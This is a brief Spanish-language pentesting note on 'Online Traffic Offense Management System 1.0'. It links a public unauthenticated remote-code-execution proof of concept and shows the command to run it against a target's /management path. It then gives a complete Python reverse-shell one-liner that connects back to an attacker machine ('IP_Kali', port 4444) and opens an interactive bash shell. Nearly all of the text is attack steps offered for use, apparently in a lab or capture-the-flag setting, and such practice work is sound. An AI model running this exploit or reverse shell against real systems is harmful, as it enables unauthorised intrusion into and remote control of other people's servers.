# Traffic Offense Management System 

Tags: #Linux 

## Versión 1.0
* [PoC](https://github.com/hunkaracar/Online-Traffic-Offense-Management-System-1.0---Remote-Code-Execution-RCE-Unauthenticated-)
```bash 
# Obtener un RCE   
❯ python2 toms.py http://IP:445        # Ejecutar el exploit 
	URL: http://IP:445/management      # Colocar la ruta del dir /management 

NOTA: 
	- Entrega un shell limitada 
```

```bash 
# Si se obtiene una shell limitada, ejecutar una reverse shell mediante Python para obtener una shell interactiva desde Kali
❯ which python3   # Mirar si python3 esta instalado 
❯ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

